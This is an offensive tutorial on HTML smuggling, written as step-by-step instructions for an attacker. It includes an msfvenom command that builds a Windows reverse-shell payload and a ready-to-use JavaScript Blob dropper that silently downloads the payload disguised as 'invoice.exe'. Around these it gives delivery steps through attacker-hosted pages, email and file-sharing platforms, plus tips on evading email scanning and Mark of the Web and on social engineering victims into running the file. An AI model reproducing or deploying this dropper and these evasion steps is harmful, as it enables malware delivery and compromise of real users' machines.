# HTML Smuggling

**Type:** Malicious Documents & File-Based Delivery
**Platform:** Windows, macOS, Linux (target browser-dependent)  
**Prerequisites:** User must click a malicious link or open a crafted HTML file in a browser; JavaScript must be enabled (default)


---
## Overview

**HTML Smuggling** is a browser-based technique that allows an attacker to **assemble and deliver malicious payloads on the client side**, bypassing traditional email and network security filters. Instead of downloading an executable directly from a remote server, the attacker uses JavaScript to reconstruct the payload in memory or in a blob object, and **triggers a download locally via the browser** making the transfer appear "user-generated."

This technique is widely used in malware campaigns like **APT29**, **Nobelium**, and **Emotet** to deliver downloaders, stealers, and RATs.



---
## How It Works

1. The attacker sends a malicious `.html` file or a phishing link.
2. The user opens the file in a browser (usually Edge, Chrome, or Firefox).
3. Embedded JavaScript code **dynamically builds a malicious file** (e.g., `.js`, `.exe`, `.bat`, `.hta`) using `Blob` and `URL.createObjectURL`.
4. A forced browser download is triggered, typically a password-protected `.zip` or `.js` file.
5. The user executes the downloaded file (stage 2), resulting in code execution .

Because the payload is assembled in memory on the client side, **no actual malware ever crosses the network**, evading perimeter detection tools like firewalls, IDS/IPS, or antivirus scanners.


---
## Prerequisites

- Web server or file hosting platform (optional)
- Browser with JavaScript enabled (default in most modern browsers)
- payload ( `.ps1`, `.exe`, `.js`, `.bat`, or `.vbs` ) "stage2"
- Optional: ZIP archiver for delivery (to evade detection)



---
## Steps to Implement

 1. **Generate a Payload (Example: Reverse Shell)**

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f exe -o payload.exe
```

2. **Convert Payload to Base64**
```bash
base64 -w 0 payload.exe > payload.b64
```

3. **Embed Payload in HTML Smuggling Template**

```html
<!DOCTYPE html>
<html>
<body>
<script>
var b64 = 'BASE64_ENCODED_PAYLOAD_HERE';
var binary = atob(b64);
var len = binary.length;
var bytes = new Uint8Array(len);
for (var i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
}
var blob = new Blob([bytes], {type: 'application/octet-stream'});
var link = document.createElement('a');
link.href = window.URL.createObjectURL(blob);
link.download = 'invoice.exe';
link.click();
</script>
<p>If nothing downloads, click <a href="#" onclick="link.click()">here</a>.</p>
</body>
</html>
```


> Replace "BASE64_ENCODED_PAYLOAD_HERE" with the full base64 of your payload ( stage2 ).


![[prepare-html-payload.png]]

4. **Host/Deliver the File**

Option 1: Host the file on your web server (e.g., http://attacker.com/delivery.html)

Option 2: Email the HTML file as an attachment

when victim opens the html document it will download our payload ( stage2 ) automatically :
![[open-html-payload.png]]



5. **Execution**
once the file is downloaded on the victim machine, wait until the victim execute it manually ( you can use social engineering !)

![[extract-downloaded-7z-file.png]]
victim open stage2 payload ( malware )
![[pwnd.png]]



---
## Payload/Code Snippets

- **HTML-Based JS Dropper (Blob + Link) , This is the core of HTML smuggling.**
```html
<!DOCTYPE html>
<html>
<body>
<script>
var b64 = 'BASE64_ENCODED_PAYLOAD_HERE';
var binary = atob(b64);
var len = binary.length;
var bytes = new Uint8Array(len);
for (var i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
}
var blob = new Blob([bytes], {type: 'application/octet-stream'});
var link = document.createElement('a');
link.href = window.URL.createObjectURL(blob);
link.download = 'invoice.exe';
link.click();
</script>
<p>If nothing downloads, click <a href="#" onclick="link.click()">here</a>.</p>
</body>
</html>
```


---
## Tips

- Use password-protected ZIP archives to wrap .exe or .js files and bypass email scanning
- Use 7zip files to evade the ( Mark of The Web ) security mechanism
- Deliver .html files via legitimate file-sharing platforms like OneDrive or Google Drive
- Use non-executable file extensions (like .txt) and change them post-download via JavaScript
- Trigger download via `link.click()` inside `<script>` to avoid visible hyperlinks
- Combine with JavaScript obfuscation (e.g., JSFuck or packers) for stealth
 


---
## References

- [MITRE ATT&CK T1027.006: HTML Smuggling](https://attack.mitre.org/techniques/T1027/006/)
- [HTML Smuggling: How Blob URLs are Abused to Deliver Phishing Content](https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/html-smuggling-how-blob-urls-are-abused-to-deliver-phishing-content/)
- [HTML smuggling: A Stealthier Approach to Deliver Malware](https://www.cyfirma.com/research/html-smuggling-a-stealthier-approach-to-deliver-malware/)


---

**_Author_** : **o-sec**
